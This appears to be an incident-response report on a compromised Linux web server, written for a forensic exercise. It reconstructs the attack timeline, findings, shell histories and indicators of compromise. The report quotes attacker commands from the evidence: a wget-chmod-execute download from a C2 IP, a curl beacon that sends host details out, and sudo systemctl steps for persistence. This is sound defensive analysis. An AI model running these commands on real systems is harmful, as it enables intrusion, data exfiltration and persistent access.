All 8 claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

The host **webserver-prod-02** was compromised through two attack vectors. First, the **www-data** service account was used to download and execute malware from a known C2 server (`185.229.59.103`). Second, the **deploy** account was accessed via SSH from that same C2 IP using a stolen SSH key. The attacker leveraged deploy's passwordless sudo access to `systemctl` to install a persistent C2 beacon service (`system-updater.service`) that phones home every 10 minutes. The attacker also took anti-forensic measures — none of the malicious commands appear in deploy's bash history.

## Attack Timeline (UTC)

| Time | Event | Source |
|------|-------|--------|
| Apr 13, various | Normal admin activity by deploy (10.0.1.50), alice (10.0.2.15), bob (10.0.2.22) | auth.log:3-29 |
| **Apr 14 03:17:44** | **deploy logs in from C2 IP 185.229.59.103 via publickey** | auth.log:30 |
| Apr 14 03:18:02 | deploy runs `sudo cat /etc/passwd` (reconnaissance) | auth.log:32 |
| Apr 14 03:18:12 | deploy runs `sudo cp /tmp/update /usr/local/bin/update` (drops binary) | auth.log:35 |
| Apr 14 03:18:17 | deploy runs `sudo chmod +x /usr/local/bin/update` | auth.log:36 |
| Apr 14 03:18:29 | deploy runs `sudo tee /etc/systemd/system/system-updater.service` (installs persistence) | auth.log:37 |
| Apr 14 03:18:44 | deploy runs `sudo systemctl daemon-reload` | auth.log:38 |
| Apr 14 03:18:58 | deploy runs `sudo systemctl enable system-updater.service` (persistence across reboots) | auth.log:39 |
| Apr 14 03:19:03 | deploy runs `sudo systemctl start system-updater.service` (activates beacon) | auth.log:40 |
| Apr 14 08:25+ | Normal deploy/bob activity resumes | auth.log:44-48 |

## Findings

### 1. Compromised SSH Access (CONFIRMED)
The `deploy` account was accessed from `185.229.59.103` (confirmed C2 server) via publickey authentication at 03:17:44 on Apr 14 (auth.log:30). No brute force preceded this — the attacker possessed a valid SSH private key.

### 2. www-data Attacker Activity (CONFIRMED)
The shell history at `fs/var/www/.bash_history` (lines 1-7) shows:
```
id
uname -a
cd /tmp
wget http://185.229.59.103/u -O /tmp/.u
chmod +x /tmp/.u
/tmp/.u &
cat /etc/passwd
```
This is a classic post-exploitation sequence: recon, malware download from C2, execution, and credential harvesting. This suggests initial compromise occurred through the web application running as www-data.

### 3. Persistent C2 Beacon (CONFIRMED)
A malicious systemd service `system-updater.service` was installed at `etc/systemd/system/system-updater.service`. It runs as root and executes:
```
/usr/bin/curl -sX POST https://185.229.59.103:8443/beacon -d "host=$(hostname)&ip=$(hostname -I)"
```
It restarts every 600 seconds and is enabled at boot via `WantedBy=multi-user.target`.

### 4. Privilege Escalation via Sudoers Misconfiguration (CONFIRMED)
The file `etc/sudoers.d/deploy` grants: `deploy ALL=(root) NOPASSWD: /usr/bin/systemctl`. This allowed the attacker to install and enable the malicious service as root without a password.

### 5. Anti-Forensics (CONFIRMED)
Deploy's bash history (`fs/home/deploy/.bash_history`) contains 15 benign CI/CD commands but none of the 7 malicious sudo commands recorded in auth.log lines 32-40. The attacker either suppressed history recording (e.g., `unset HISTFILE`) or cleaned the file.

### 6. C2 Infrastructure (CONFIRMED)
IP `185.229.59.103` is confirmed as a C2 server via threat intelligence lookup. It appears in three contexts: SSH login source for deploy, wget download source in www-data's history, and the beacon destination in the systemd service.

## Shell Histories Analyzed

| Account | Path | Size | Commands | Findings |
|---------|------|------|----------|----------|
| **root** | `fs/root/.bash_history` | 80 bytes | 4 | Benign admin commands (apt update/upgrade, systemctl restart nginx, tail log) |
| **deploy** | `fs/home/deploy/.bash_history` | 264 bytes | 15 | Benign CI/CD commands only; malicious activity absent (anti-forensics) |
| **alice** | `fs/home/alice/.bash_history` | 123 bytes | 6 | Benign admin commands (ls, cd, tail nginx logs, journalctl) |
| **www-data** | `fs/var/www/.bash_history` | 103 bytes | 7 | **Attacker activity**: recon, malware download, execution, credential access |
| **bob** | (no history file) | — | — | Bob logged in twice but has no shell history file |

## Indicators of Compromise

| IOC | Type | Context |
|-----|------|---------|
| `185.229.59.103` | IP (C2 server) | SSH login source, malware download, beacon destination |
| `https://185.229.59.103:8443/beacon` | URL | C2 beacon endpoint in systemd service |
| `http://185.229.59.103/u` | URL | Malware download URL in www-data history |
| `/tmp/.u` | File path | Downloaded malware binary |
| `/usr/local/bin/update` | File path | Dropped binary (copied from /tmp/update) |
| `system-updater.service` | Persistence | Malicious systemd unit |

## Case Questions

**Case Q1:** I analyzed the shell histories of **five accounts**: **root** (`fs/root/.bash_history`), **deploy** (`fs/home/deploy/.bash_history`), **alice** (`fs/home/alice/.bash_history`), **www-data** (`fs/var/www/.bash_history`), and noted that **bob** has no shell history file despite having logged in. All four existing history files were examined.

**Case Q2:** Yes — the **www-data** account's shell history (`fs/var/www/.bash_history`, lines 1-7) shows what the attacker did: they ran `id` and `uname -a` for reconnaissance, changed to `/tmp`, downloaded malware from the C2 server with `wget http://185.229.59.103/u -O /tmp/.u`, made it executable with `chmod +x /tmp/.u`, launched it in the background with `/tmp/.u &`, and read `/etc/passwd`. Additionally, the **deploy** account's history is notable for what it does *not* show — the 7 malicious sudo commands recorded in the auth log (installing the C2 beacon service) are completely absent from deploy's bash history, indicating the attacker suppressed or cleaned history recording during that session.